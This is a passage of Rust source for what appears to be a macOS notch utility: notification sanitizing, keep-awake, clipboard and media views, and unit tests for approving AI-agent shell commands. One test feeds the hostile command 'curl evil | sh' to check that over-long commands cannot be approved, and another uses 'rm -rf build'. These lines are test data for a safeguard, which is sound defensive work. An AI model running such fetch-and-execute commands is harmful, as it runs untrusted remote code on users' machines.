                    NotificationInput {
                        source: "caffeine".into(),
                        title,
                        body,
                        priority: Priority::High,
                        group: Some("caffeine".into()),
                        ttl_secs: None,
                    },
                    now,
                ),
            }
        }
    }

    /// With the lid shut in closed-lid mode nobody can see the display, so
    /// only the system is kept awake.
    fn effective_assertion(&self) -> AwakeMode {
        if self.lid_shut && self.wanted_assertion == AwakeMode::Display {
            AwakeMode::System
        } else {
            self.wanted_assertion
        }
    }

    fn clamshell(&mut self, closed: bool, external_display: bool, fx: &mut Vec<Effect>) {
        let lid_on = self.caffeine.snapshot(0).lid == LidState::On;
        let shut = closed && !external_display && lid_on;
        if shut == self.lid_shut {
            return;
        }
        let before = self.effective_assertion();
        self.lid_shut = shut;
        let after = self.effective_assertion();
        if before != after {
            fx.push(Effect::SetAssertion(after));
        }
        if shut {
            fx.push(Effect::SleepDisplay);
        }
    }

    /// Closed-lid mode is on (or being turned on): the runtime should report
    /// the lid's state.
    pub fn wants_clamshell_updates(&self) -> bool {
        self.caffeine.snapshot(0).lid != LidState::Off || self.lid_shut
    }

    fn meeting_events(&mut self, events: Vec<MeetingEvent>, now: u64) {
        for event in events {
            let (title, body) = match event {
                MeetingEvent::Started => {
                    self.count(Feature::MeetingStart, now);
                    continue;
                }
                MeetingEvent::TimeUp { item, next } => (
                    format!("Time's up: {item}"),
                    match next {
                        Some(next) => format!("Next: {next}"),
                        None => "Last item. Wrap up when ready.".to_string(),
                    },
                ),
                MeetingEvent::Finished {
                    planned_secs,
                    elapsed_secs,
                } => {
                    self.count(Feature::MeetingFinish, now);
                    (
                        "Meeting finished".to_string(),
                        format!(
                            "Took {} min, planned {} min.",
                            elapsed_secs.div_ceil(60),
                            planned_secs / 60
                        ),
                    )
                }
            };
            self.post(
                NotificationInput {
                    source: "meeting".into(),
                    title,
                    body,
                    priority: Priority::High,
                    group: Some("meeting".into()),
                    ttl_secs: None,
                },
                now,
            );
        }
    }

    fn post(&mut self, input: NotificationInput, now: u64) {
        let (_, events) = self.notify.post(input, now);
        self.notify_events(events, now);
    }

    fn notify_events(&mut self, events: Vec<NotifyEvent>, now: u64) {
        for event in events {
            match event {
                NotifyEvent::BannerShown { .. } => self.count(Feature::NotificationShown, now),
                NotifyEvent::HeldDelivered { count } => {
                    let noun = if count == 1 {
                        "notification"
                    } else {
                        "notifications"
                    };
                    self.post(
                        NotificationInput {
                            source: "litenotch".into(),
                            title: "While you were focusing".into(),
                            body: format!("{count} {noun} waiting in the inbox."),
                            priority: Priority::Normal,
                            group: Some("held".into()),
                            ttl_secs: None,
                        },
                        now,
                    );
                }
                NotifyEvent::BannerHidden { .. } => {}
            }
        }
    }

    /// Notifications from other local processes are untrusted: text is
    /// sanitized and capped, and they can neither claim `Critical` nor pin a
    /// banner.
    fn external_notify(&mut self, mut input: NotificationInput, now: u64) {
        // Only the core marks a notification as another app's banner.
        if input
            .group
            .as_deref()
            .is_some_and(|g| g.starts_with(SYSTEM_GROUP))
        {
            input.group = None;
        }
        // Nor may a script pose as LiteNotch or an agent: those sources pick
        // where a click goes and replace the real notification of their group.
        if RESERVED_SOURCES.contains(&input.source.trim()) {
            input.source = format!("{} (script)", input.source.trim());
        }
        self.post_capped(input, now);
    }

    /// Sanitizes and caps a notification whose text came from outside.
    fn post_capped(&mut self, mut input: NotificationInput, now: u64) {
        input.source = truncate_chars(&sanitize(&input.source), EXTERNAL_SOURCE_CHARS);
        if input.source.is_empty() {
            input.source = "external".into();
        }
        input.title = truncate_chars(&sanitize(&input.title), EXTERNAL_TITLE_CHARS);
        input.body = truncate_chars(&sanitize(&input.body), EXTERNAL_BODY_CHARS);
        input.priority = input.priority.min(Priority::High);
        input.ttl_secs = input.ttl_secs.map(|t| t.clamp(1, EXTERNAL_MAX_TTL_SECS));
        if input.title.is_empty() && input.body.is_empty() {
            return;
        }
        self.count(Feature::ExternalNotify, now);
        self.post(input, now);
    }

    /// Where clicking a notification goes: the app it came from, the
    /// session's terminal, or the tab that belongs to it.
    fn open_target(&self, n: &Notification) -> Option<OpenTarget> {
        let tab = |tab: &str, pane: Option<&str>| {
            Some(OpenTarget::Tab {
                tab: tab.into(),
                pane: pane.map(str::to_owned),
            })
        };
        if n.group
            .as_deref()
            .is_some_and(|g| g.starts_with(SYSTEM_GROUP))
        {
            return Some(OpenTarget::AppNamed {
                name: n.source.clone(),
            });
        }
        match n.source.as_str() {
            "agent" => {
                let session = n.group.as_deref()?.strip_prefix("agent-")?;
                let found = self.agents.sessions().iter().find(|s| s.id == session);
                match found.and_then(|s| s.app.clone()) {
                    Some(bundle_id) => Some(OpenTarget::App {
                        bundle_id,
                        tty: found.and_then(|s| s.tty.clone()),
                    }),
                    None => tab("agents", Some("sessions")),
                }
            }
            "pomodoro" => tab("timer", Some("focus")),
            "meeting" => tab("timer", Some("meeting")),
            "timer" => tab("timer", Some("countdown")),
            "usage" => tab("agents", Some("usage")),
            "litenotch" => tab("agents", Some("sessions")),
            "caffeine" => tab("settings", Some("keep_awake")),
            "color" => tab("clipboard", None),
            _ => None,
        }
    }

    /// A banner from another app. The text is whatever that app put on
    /// screen, so it gets the same treatment as a socket notification.
    fn system_notify(&mut self, app: String, title: String, body: String, now: u64) {
        if !self.settings.notify.system {
            return;
        }
        self.system_seq = self.system_seq.wrapping_add(1);
        self.post_capped(
            NotificationInput {
                source: app,
                title,
                body,
                priority: Priority::Normal,
                group: Some(format!("{SYSTEM_GROUP}{}", self.system_seq)),
                ttl_secs: None,
            },
            now,
        );
    }

    fn usage_alerts(&mut self, now: u64) {
        if !self.settings.general.usage_alerts {
            return;
        }
        let snap = self.usage.snapshot(now);
        let windows = [("5-hour", &snap.five_hour), ("7-day", &snap.seven_day)];
        for (i, (label, window)) in windows.into_iter().enumerate() {
            let Some(window) = window else { continue };
            let level = USAGE_ALERT_LEVELS
                .iter()
                .rev()
                .copied()
                .find(|l| window.used_pct >= f32::from(*l))
                .unwrap_or(0);
            if level > self.usage_alerted[i] {
                self.post(
                    NotificationInput {
                        source: "usage".into(),
                        title: format!("{label} limit at {:.0}%", window.used_pct),
                        body: "Claude usage is getting close to the limit.".into(),
                        priority: Priority::High,
                        group: Some(format!("usage-{i}")),
                        ttl_secs: None,
                    },
                    now,
                );
            }
            // Dropping back below a level (the window reset) re-arms it.
            self.usage_alerted[i] = level;
        }
    }

    pub fn view(&self, now: u64) -> ViewModel {
        let pomo = self.pomodoro.snapshot(now);
        let running = pomo.run_state == RunState::Running;
        let pomodoro = PomodoroView {
            phase: pomo.phase,
            run_state: pomo.run_state,
            remaining_secs: if running {
                pomo.total_secs
            } else {
                pomo.remaining_secs
            },
            total_secs: pomo.total_secs,
            ends_at_ms: self.pomodoro.next_deadline(),
            round: pomo.round,
            rounds_before_long: pomo.rounds_before_long,
            completed_today: pomo.completed_today,
            focus_secs_today: pomo.focus_secs_today,
        };
        let media = self.media.active().map(|np| MediaView {
            app: np.app.clone(),
            title: np.title.clone(),
            artist: np.artist.clone(),
            album: np.album.clone(),
            playing: np.playing,
            duration_ms: np.duration_ms,
            position_ms: np.position_ms,
            position_at_ms: np.updated_ms,
            controllable: true,
            artwork_path: np.artwork_path.clone(),
        });
        let matches = self.clipboard.search(&self.clip_query);
        let clipboard = ClipboardView {
            total: matches.len(),
            items: matches
                .into_iter()
                .take(CLIP_VIEW_ITEMS)
                .map(|item| ClipView {
                    id: item.id,
                    kind: item.kind,
                    preview: ClipboardHistory::preview(&item.text, CLIP_PREVIEW_CHARS),
                    source_app: item.source_app.clone(),
                    created_ms: item.created_ms,
                    pinned: item.pinned,
                    image_path: item.image_path.clone(),
                    rich: item.rich_path.is_some(),
                    files: match item.kind {
                        ClipKind::Files => item
                            .text
                            .lines()
                            .filter(|l| l.starts_with('/'))
                            .take(CLIP_VIEW_FILES)
                            .map(str::to_owned)
                            .collect(),
                        _ => Vec::new(),
                    },
                })
                .collect(),
            query: self.clip_query.clone(),
        };
        let with_target = |n: &Notification| Notification {
            open: self.open_target(n),
            ..n.clone()
        };
        let inbox = InboxView {
            banner: self.notify.current_banner().map(with_target),
            history: self
                .notify
                .history()
                .iter()
                .take(HISTORY_VIEW_ITEMS)
                .map(with_target)
                .collect(),
            unread: self.notify.unread_count(),
            dnd: self.dnd,
        };
        let agents = AgentsView {
            sessions: self.agents.sessions().to_vec(),
            pending: self.agents.pending().to_vec(),
            hooks_installed: self.hooks_installed,
            statusline_installed: self.statusline_installed,
        };
        let caf = self.caffeine.snapshot(now);
        let caffeine = CaffeineView {
            mode: caf.mode,
            lid: caf.lid,
            until_ms: caf.until_ms,
            guard: caf.guard,
        };
        let today = day_index(now, self.utc_offset_secs);
        let compact = self.compact(&pomodoro, &media, &inbox, &agents, &caffeine);
        ViewModel {
            attention: matches!(compact.kind, ActivityKind::Approval | ActivityKind::Banner),
            compact,
            pomodoro,
            media,
            clipboard,
            inbox,
            agents,
            usage: {
                // Status lines arrive every few seconds; minute granularity
                // keeps an unchanged reading from re-sending the view model.
                let mut usage = self.usage.snapshot(now);
                usage.updated_ms -= usage.updated_ms % 60_000;
                // The model name comes from outside like any other text shown.
                usage.model = usage.model.map(|m| truncate_chars(&sanitize(&m), 60));
                usage
            },
            caffeine,
            meeting: self.meeting.view(),
            timer: self.timer.view(),
            colors: self.colors.clone(),
            analytics: self
                .analytics
                .totals(today.saturating_sub(ANALYTICS_VIEW_DAYS - 1)),
            settings: self.settings.clone(),
        }
    }

    /// Picks the one activity the closed notch shows:
    /// approval > banner > pomodoro > media > caffeine > working agent.
    fn compact(
        &self,
        pomodoro: &PomodoroView,
        media: &Option<MediaView>,
        inbox: &InboxView,
        agents: &AgentsView,
        caffeine: &CaffeineView,
    ) -> CompactView {
        let view = |kind, title: &str, value: &str| CompactView {
            kind,
            title: title.to_string(),
            value: value.to_string(),
            ends_at_ms: None,
            total_secs: None,
            count: 0,
        };
        if let Some(request) = agents.pending.first() {
            return CompactView {
                count: agents.pending.len() as u32,
                ends_at_ms: Some(request.expires_ms),
                ..view(ActivityKind::Approval, &request.project, &request.tool_name)
            };
        }
        if let Some(banner) = &inbox.banner {
            return view(ActivityKind::Banner, &banner.title, &banner.source);
        }
        if let Some(name) = self.meeting.current_name() {
            let m = self.meeting.view();
            let value = if m.run_state == MeetingRun::Paused {
                "Paused".to_string()
            } else {
                String::new()
            };
            return CompactView {
                ends_at_ms: m.ends_at_ms,
                ..view(ActivityKind::Meeting, name, &value)
            };
        }
        let timer = self.timer.view();
        if matches!(timer.run_state, TimerRun::Running | TimerRun::Paused) {
            let value = if timer.run_state == TimerRun::Paused {
                mmss(timer.remaining_secs)
            } else {
                String::new()
            };
            return CompactView {
                ends_at_ms: timer.ends_at_ms,
                total_secs: Some(timer.duration_secs),
                ..view(ActivityKind::Timer, "Timer", &value)
            };
        }
        if pomodoro.phase != Phase::Idle {
            let value = if pomodoro.ends_at_ms.is_some() {
                String::new()
            } else {
                mmss(pomodoro.remaining_secs)
            };
            return CompactView {
                ends_at_ms: pomodoro.ends_at_ms,
                total_secs: Some(pomodoro.total_secs),
                ..view(ActivityKind::Pomodoro, phase_label(pomodoro.phase), &value)
            };
        }
        if let Some(m) = media.as_ref().filter(|m| m.playing) {
            return view(ActivityKind::Media, &m.title, &m.artist);
        }
        if caffeine.mode != AwakeMode::Off {
            let value = if caffeine.lid == LidState::On {
                "lid"
            } else {
                ""
            };
            return CompactView {
                ends_at_ms: caffeine.until_ms,
                ..view(ActivityKind::Caffeine, "Awake", value)
            };
        }
        let working: Vec<&AgentSession> = agents
            .sessions
            .iter()
            .filter(|s| s.status == AgentStatus::Working)
            .collect();
        if let Some(session) = working.first() {
            return CompactView {
                count: working.len() as u32,
                ..view(ActivityKind::Agent, &session.project, "working")
            };
        }
        view(ActivityKind::Idle, "", "")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const T0: u64 = 1_700_000_000_000;

    fn core() -> Core {
        Core::default()
    }

    fn cmd(core: &mut Core, command: Command, now: u64) -> Vec<Effect> {
        core.apply(Input::Command(command), now)
    }

    fn hook(core: &mut Core, value: serde_json::Value, now: u64) -> (HookOutcome, Vec<Effect>) {
        core.hook(&value.to_string(), now)
    }

    fn permission(core: &mut Core, session: &str, command: &str, now: u64) -> String {
        let (outcome, _) = hook(
            core,
            json!({"hook_event_name":"PermissionRequest","session_id":session,"cwd":"/work/api",
                   "tool_name":"Bash","tool_input":{"command":command}}),
            now,
        );
        match outcome {
            HookOutcome::Pending(id) => id,
            other => panic!("expected a pending request, got {other:?}"),
        }
    }

    fn text(s: &str) -> Input {
        Input::ClipCaptured(ClipCapture {
            kind: ClipKind::Text,
            text: s.into(),
            source_app: Some("Notes".into()),
            concealed: false,
            image_path: None,
            rich_path: None,
        })
    }

    fn note(title: &str, priority: Priority) -> NotificationInput {
        NotificationInput {
            source: "test".into(),
            title: title.into(),
            body: "b".into(),
            priority,
            group: None,
            ttl_secs: None,
        }
    }

    fn uses(core: &Core, feature: Feature) -> u32 {
        core.view(T0)
            .analytics
            .iter()
            .find(|f| f.feature == feature.name())
            .map_or(0, |f| f.count)
    }

    #[test]
    fn a_fresh_core_is_idle_with_nothing_scheduled() {
        let c = core();
        let v = c.view(T0);
        assert_eq!(v.compact.kind, ActivityKind::Idle);
        assert!(!v.attention);
        assert_eq!(c.next_deadline(), None);
        assert!(!c.wants_power_updates());
        assert_eq!(v.pomodoro.remaining_secs, 1500);
        assert!(v.media.is_none() && v.inbox.banner.is_none() && v.agents.pending.is_empty());
        assert_eq!(c.settings(), &Settings::default());
    }

    #[test]
    fn pomodoro_runs_shows_a_countdown_and_completes_with_a_notice() {
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        let v = c.view(T0 + 1000);
        assert_eq!(v.compact.kind, ActivityKind::Pomodoro);
        assert_eq!(v.compact.title, "Focus");
        assert_eq!(v.compact.ends_at_ms, Some(T0 + 1_500_000));
        assert_eq!(v.compact.total_secs, Some(1500));
        assert!(v.inbox.dnd, "focus silences low-priority notifications");
        assert_eq!(c.next_deadline(), Some(T0 + 1_500_000));

        c.apply(Input::Tick, T0 + 1_500_000);
        let v = c.view(T0 + 1_500_000);
        assert_eq!(v.pomodoro.phase, Phase::ShortBreak);
        assert_eq!(v.pomodoro.completed_today, 1);
        assert!(!v.inbox.dnd);
        assert_eq!(
            v.inbox.banner.as_ref().map(|b| b.title.as_str()),
            Some("Focus complete")
        );
        assert_eq!(v.compact.kind, ActivityKind::Banner);
        assert!(v.attention);
        assert_eq!(uses(&c, Feature::PomodoroStart), 1);
        assert_eq!(uses(&c, Feature::PomodoroComplete), 1);
        assert!(c.take_dirty());
        assert!(!c.take_dirty());
    }

    #[test]
    fn the_view_model_does_not_change_while_a_timer_just_runs() {
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        cmd(
            &mut c,
            Command::CaffeineActivate {
                mode: AwakeMode::System,
                duration_secs: Some(600),
            },
            T0,
        );
        let a = serde_json::to_string(&c.view(T0 + 1_000)).unwrap();
        let b = serde_json::to_string(&c.view(T0 + 61_000)).unwrap();
        assert_eq!(a, b, "the shell counts down itself; no per-second pushes");
    }

    #[test]
    fn pausing_shows_the_frozen_time_and_reset_returns_to_idle() {
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        cmd(&mut c, Command::PomodoroToggle, T0 + 60_000);
        let v = c.view(T0 + 999_000);
        assert_eq!(v.pomodoro.run_state, RunState::Paused);
        assert_eq!(v.compact.value, "24:00");
        assert_eq!(v.compact.ends_at_ms, None);
        assert!(
            !v.inbox.dnd,
            "a paused focus does not silence notifications"
        );
        // Resuming is not counted as a new start.
        cmd(&mut c, Command::PomodoroToggle, T0 + 999_000);
        assert_eq!(uses(&c, Feature::PomodoroStart), 1);
        cmd(&mut c, Command::PomodoroReset, T0 + 999_000);
        assert_eq!(c.view(T0).compact.kind, ActivityKind::Idle);
    }

    #[test]
    fn skipping_counts_and_does_not_notify() {
        let mut c = core();
        cmd(&mut c, Command::PomodoroSkip, T0);
        assert_eq!(
            uses(&c, Feature::PomodoroSkip),
            0,
            "nothing to skip while idle"
        );
        cmd(&mut c, Command::PomodoroToggle, T0);
        cmd(&mut c, Command::PomodoroSkip, T0 + 5);
        let v = c.view(T0 + 5);
        assert_eq!(uses(&c, Feature::PomodoroSkip), 1);
        assert!(v.inbox.banner.is_none());
        assert_eq!(v.pomodoro.completed_today, 0);
    }

    #[test]
    fn focus_holds_normal_notifications_and_reports_them_afterwards() {
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        c.apply(
            Input::ExternalNotify(note("build done", Priority::Normal)),
            T0 + 1,
        );
        c.apply(
            Input::ExternalNotify(note("lint done", Priority::Low)),
            T0 + 2,
        );
        let v = c.view(T0 + 3);
        assert!(v.inbox.banner.is_none());
        assert_eq!(v.inbox.unread, 2);
        assert_eq!(v.compact.kind, ActivityKind::Pomodoro);
        // High priority still gets through.
        c.apply(
            Input::ExternalNotify(note("prod down", Priority::High)),
            T0 + 4,
        );
        assert_eq!(c.view(T0 + 4).inbox.banner.unwrap().title, "prod down");
        cmd(&mut c, Command::NotifyDismissBanner, T0 + 5);
        cmd(&mut c, Command::PomodoroToggle, T0 + 6);
        let titles: Vec<String> = c
            .view(T0 + 6)
            .inbox
            .history
            .iter()
            .map(|n| n.title.clone())
            .collect();
        assert!(
            titles.contains(&"While you were focusing".to_string()),
            "{titles:?}"
        );
        let held = c
            .view(T0 + 6)
            .inbox
            .history
            .into_iter()
            .find(|n| n.source == "litenotch")
            .unwrap();
        assert_eq!(held.body, "2 notifications waiting in the inbox.");
    }

    #[test]
    fn dnd_can_be_switched_off_in_settings() {
        let mut c = core();
        let mut s = Settings::default();
        s.notify.dnd_during_focus = false;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        cmd(&mut c, Command::PomodoroToggle, T0);
        c.apply(Input::ExternalNotify(note("hello", Priority::Low)), T0 + 1);
        let v = c.view(T0 + 1);
        assert!(!v.inbox.dnd);
        assert_eq!(v.inbox.banner.unwrap().title, "hello");
    }

    #[test]
    fn a_higher_priority_notification_preempts_and_a_lower_one_waits() {
        let mut c = core();
        c.apply(Input::ExternalNotify(note("normal", Priority::Normal)), T0);
        c.apply(Input::ExternalNotify(note("low", Priority::Low)), T0 + 1);
        assert_eq!(c.view(T0 + 1).inbox.banner.unwrap().title, "normal");
        c.apply(Input::ExternalNotify(note("high", Priority::High)), T0 + 2);
        assert_eq!(c.view(T0 + 2).inbox.banner.unwrap().title, "high");
        // Banners expire through the deadline the runtime sleeps on.
        let deadline = c.next_deadline().unwrap();
        c.apply(Input::Tick, deadline);
        assert_eq!(c.view(deadline).inbox.banner.unwrap().title, "normal");
        assert_eq!(uses(&c, Feature::ExternalNotify), 3);
        assert!(uses(&c, Feature::NotificationShown) >= 3);
    }

    #[test]
    fn external_notifications_are_sanitized_capped_and_cannot_pin() {
        let mut c = core();
        c.apply(
            Input::ExternalNotify(NotificationInput {
                source: String::new(),
                title: format!("hi\u{202E}{}", "x".repeat(500)),
                body: "y".repeat(5000),
                priority: Priority::Critical,
                group: None,
                ttl_secs: Some(86_400),
            }),
            T0,
        );
        let banner = c.view(T0).inbox.banner.unwrap();
        assert_eq!(banner.source, "external");
        assert_eq!(banner.title.chars().count(), 120);
        assert!(banner.title.starts_with("hi\u{FFFD}"));
        assert_eq!(banner.body.chars().count(), 500);
        assert_eq!(banner.priority, Priority::High);
        assert_eq!(banner.ttl_secs, Some(60));
        // An empty notification is dropped.
        c.apply(
            Input::ExternalNotify(NotificationInput {
                source: "s".into(),
                ..NotificationInput::default()
            }),
            T0,
        );
        assert_eq!(c.view(T0).inbox.history.len(), 1);
    }

    #[test]
    fn inbox_commands_dismiss_mark_and_clear() {
        let mut c = core();
        c.apply(Input::ExternalNotify(note("a", Priority::Normal)), T0);
        c.apply(Input::ExternalNotify(note("b", Priority::Normal)), T0 + 1);
        let id = |c: &Core, title: &str| {
            c.view(T0)
                .inbox
                .history
                .iter()
                .find(|n| n.title == title)
                .unwrap()
                .id
        };
        // Dismissing the queued one means it never becomes a banner.
        let b = id(&c, "b");
        cmd(&mut c, Command::NotifyDismiss { id: b }, T0 + 2);
        cmd(&mut c, Command::NotifyDismissBanner, T0 + 3);
        assert!(c.view(T0 + 3).inbox.banner.is_none());
        assert_eq!(c.view(T0 + 3).inbox.history.len(), 2);
        cmd(&mut c, Command::NotifyMarkRead, T0 + 4);
        assert_eq!(c.view(T0 + 4).inbox.unread, 0);
        cmd(&mut c, Command::NotifyClear, T0 + 5);
        assert!(c.view(T0 + 5).inbox.history.is_empty());
    }

    #[test]
    fn clipboard_capture_search_pin_copy_and_clear() {
        let mut c = core();
        c.apply(text("first snippet"), T0);
        c.apply(text("second thing"), T0 + 1);
        let v = c.view(T0 + 1);
        assert_eq!(v.clipboard.total, 2);
        assert_eq!(v.clipboard.items[0].preview, "second thing");
        let first = v.clipboard.items[1].id;

        cmd(
            &mut c,
            Command::ClipQuery {
                query: "SNIP".into(),
            },
            T0 + 2,
        );
        let v = c.view(T0 + 2);
        assert_eq!((v.clipboard.total, v.clipboard.query.as_str()), (1, "SNIP"));
        cmd(
            &mut c,
            Command::ClipQuery {
                query: "SNIPP".into(),
            },
            T0 + 2,
        );
        assert_eq!(
            uses(&c, Feature::ClipboardSearch),
            1,
            "one search, not one per keystroke"
        );
        cmd(
            &mut c,
            Command::ClipQuery {
                query: String::new(),
            },
            T0 + 2,
        );

        assert_eq!(
            cmd(&mut c, Command::ClipCopy { id: first }, T0 + 3),
            vec![Effect::WriteClipboard("first snippet".into())]
        );
        assert!(cmd(&mut c, Command::ClipCopy { id: 9999 }, T0 + 3).is_empty());
        cmd(
            &mut c,
            Command::ClipPin {
                id: first,
                pinned: true,
            },
            T0 + 4,
        );
        cmd(
            &mut c,
            Command::ClipPin {
                id: 9999,
                pinned: true,
            },
            T0 + 4,
        );
        assert!(c.view(T0 + 4).clipboard.items[0].pinned);
        cmd(&mut c, Command::ClipClear, T0 + 5);
        assert_eq!(
            c.view(T0 + 5).clipboard.total,
            1,
            "pinned items survive a clear"
        );
        cmd(&mut c, Command::ClipRemove { id: first }, T0 + 6);
        assert_eq!(c.view(T0 + 6).clipboard.total, 0);
        assert_eq!(uses(&c, Feature::ClipboardCopy), 1);
        assert_eq!(uses(&c, Feature::ClipboardPin), 1);
    }

    #[test]
    fn long_clipboard_text_reaches_the_shell_only_as_a_preview() {
        let mut c = core();
        c.apply(text(&"word ".repeat(10_000)), T0);
        let json = serde_json::to_string(&c.view(T0)).unwrap();
        assert!(json.len() < 4_000, "view model was {} bytes", json.len());
    }

    #[test]
    fn clipboard_is_persisted_only_when_asked() {
        let mut c = core();
        c.apply(text("secret-ish"), T0);
        assert!(!c.take_dirty());
        assert_eq!(c.persisted().clipboard, None);

        let mut s = Settings::default();
        s.general.persist_clipboard = true;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        c.take_dirty();
        c.apply(text("kept"), T0 + 1);
        assert!(c.take_dirty());
        let saved = c.persisted();
        assert_eq!(saved.version, PERSIST_VERSION);
        let restored = Core::new(saved.clone());
        assert_eq!(restored.view(T0).clipboard.total, 2);

        // A saved history is ignored once the setting is off again.
        let mut off = saved;
        off.settings.general.persist_clipboard = false;
        assert_eq!(Core::new(off).view(T0).clipboard.total, 0);
    }

    #[test]
    fn media_updates_and_controls() {
        let mut c = core();
        let playing = NowPlaying {
            app: "Google Chrome".into(),
            title: "Song".into(),
            artist: "Band".into(),
            playing: true,
            duration_ms: Some(200_000),
            position_ms: Some(1_000),
            updated_ms: T0,
            artwork_path: Some("/d/artwork/art-1".into()),
            ..NowPlaying::default()
        };
        c.apply(Input::NowPlaying(Some(playing.clone())), T0);
        let v = c.view(T0 + 5);
        let m = v.media.unwrap();
        assert_eq!(
            (
                m.app.as_str(),
                m.title.as_str(),
                m.artist.as_str(),
                m.playing,
                m.controllable
            ),
            ("Google Chrome", "Song", "Band", true, true)
        );
        assert_eq!(m.position_at_ms, T0);
        assert_eq!(m.artwork_path.as_deref(), Some("/d/artwork/art-1"));
        assert_eq!(v.compact.kind, ActivityKind::Media);
        let fx = cmd(
            &mut c,
            Command::Media {
                action: MediaCommand::Next,
            },
            T0 + 6,
        );
        assert_eq!(fx, vec![Effect::MediaCommand(MediaCommand::Next)]);
        c.apply(Input::NowPlaying(None), T0 + 7);
        assert!(c.view(T0 + 7).media.is_none());
        assert!(cmd(
            &mut c,
            Command::Media {
                action: MediaCommand::PlayPause
            },
            T0 + 8
        )
        .is_empty());
        assert_eq!(uses(&c, Feature::MediaControl), 1);

        // Switched off: what is playing is dropped and updates are ignored.
        c.apply(Input::NowPlaying(Some(playing.clone())), T0 + 9);
        let mut s = c.view(T0 + 9).settings;
        s.media.enabled = false;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0 + 10,
        );
        assert!(c.view(T0 + 10).media.is_none());
        c.apply(Input::NowPlaying(Some(playing)), T0 + 11);
        assert!(c.view(T0 + 11).media.is_none());
    }

    #[test]
    fn other_apps_notifications_need_the_setting_and_are_capped() {
        let mut c = core();
        let post = |c: &mut Core, title: &str, at: u64| {
            cmd(
                c,
                Command::NotifySystem {
                    app: "Mail\u{202e}".into(),
                    title: title.into(),
                    body: "b".repeat(2_000),
                },
                at,
            );
        };
        post(&mut c, "ignored", T0);
        assert!(c.view(T0).inbox.banner.is_none());

        let mut s = c.view(T0).settings;
        assert!(!s.notify.system);
        s.notify.system = true;
        cmd(
            &mut c,
            Command::SetSettings {
                settings: Box::new(s),
            },
            T0,
        );
        post(&mut c, "Hello", T0 + 1);
        let banner = c.view(T0 + 1).inbox.banner.unwrap();
        assert_eq!(banner.title, "Hello");
        assert!(banner.source.starts_with("Mail") && !banner.source.contains('\u{202e}'));
        assert_eq!(banner.body.chars().count(), EXTERNAL_BODY_CHARS);
        assert_eq!(banner.priority, Priority::Normal);
        // Nothing to show: dropped.
        cmd(
            &mut c,
            Command::NotifySystem {
                app: "Mail".into(),
                title: String::new(),
                body: String::new(),
            },
            T0 + 2,
        );
        assert_eq!(c.view(T0 + 2).inbox.banner.unwrap().title, "Hello");
    }

    #[test]
    fn an_approval_takes_over_the_notch_and_allow_resolves_it() {
        let mut c = core();
        cmd(&mut c, Command::PomodoroToggle, T0);
        let id = permission(&mut c, "s1", "cargo test", T0 + 1);
        let v = c.view(T0 + 1);
        assert_eq!(v.compact.kind, ActivityKind::Approval);
        assert_eq!(
            (
                v.compact.title.as_str(),
                v.compact.value.as_str(),
                v.compact.count
            ),
            ("api", "Bash", 1)
        );
        assert!(v.attention);
        assert_eq!(v.agents.pending[0].detail, "cargo test");
        assert_eq!(v.agents.sessions[0].status, AgentStatus::WaitingApproval);

        let fx = cmd(
            &mut c,
            Command::AgentDecide {
                request_id: id.clone(),
                decision: Decision::Allow,
            },
            T0 + 2,
        );
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: id.clone(),
                decision: Decision::Allow
            })]
        );
        let v = c.view(T0 + 2);
        assert!(v.agents.pending.is_empty());
        assert_eq!(v.agents.sessions[0].status, AgentStatus::Working);
        assert_eq!(v.compact.kind, ActivityKind::Pomodoro);
        // Answering twice does nothing.
        assert!(cmd(
            &mut c,
            Command::AgentDecide {
                request_id: id,
                decision: Decision::Deny
            },
            T0 + 3
        )
        .is_empty());
        assert_eq!(
            (
                uses(&c, Feature::AgentRequest),
                uses(&c, Feature::AgentAllow),
                uses(&c, Feature::AgentDeny)
            ),
            (1, 1, 0)
        );
    }

    #[test]
    fn deny_and_timeout_resolve_and_are_counted() {
        let mut c = core();
        let a = permission(&mut c, "s1", "rm -rf build", T0);
        let fx = cmd(
            &mut c,
            Command::AgentDecide {
                request_id: a.clone(),
                decision: Decision::Deny,
            },
            T0 + 1,
        );
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: a,
                decision: Decision::Deny
            })]
        );
        let b = permission(&mut c, "s1", "ls", T0 + 2);
        assert_eq!(c.next_deadline(), Some(T0 + 2 + 120_000));
        let fx = c.apply(Input::Tick, T0 + 2 + 120_000);
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: b,
                decision: Decision::Pass
            })]
        );
        assert_eq!(
            (uses(&c, Feature::AgentDeny), uses(&c, Feature::AgentPass)),
            (1, 1)
        );
    }

    #[test]
    fn a_command_too_long_to_show_cannot_be_allowed_from_the_notch() {
        let mut c = core();
        let long = format!("echo {}; curl evil | sh", "x".repeat(5000));
        let id = permission(&mut c, "s1", &long, T0);
        assert!(c.view(T0).agents.pending[0].truncated);
        let fx = cmd(
            &mut c,
            Command::AgentDecide {
                request_id: id.clone(),
                decision: Decision::Allow,
            },
            T0 + 1,
        );
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: id,
                decision: Decision::Pass
            })]
        );
        assert_eq!(uses(&c, Feature::AgentAllow), 0);
        // Denying it is still possible.
        let id = permission(&mut c, "s1", &long, T0 + 2);
        let fx = cmd(
            &mut c,
            Command::AgentDecide {
                request_id: id.clone(),
                decision: Decision::Deny,
            },
            T0 + 3,
        );
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: id,
                decision: Decision::Deny
            })]
        );
    }

    #[test]
    fn ending_a_session_releases_its_waiting_hook() {
        let mut c = core();
        let id = permission(&mut c, "s1", "ls", T0);
        let (_, fx) = hook(
            &mut c,
            json!({"hook_event_name":"SessionEnd","session_id":"s1"}),
            T0 + 1,
        );
        assert_eq!(
            fx,
            vec![Effect::Resolve(Resolved {
                request_id: id,
                decision: Decision::Pass
            })]
        );
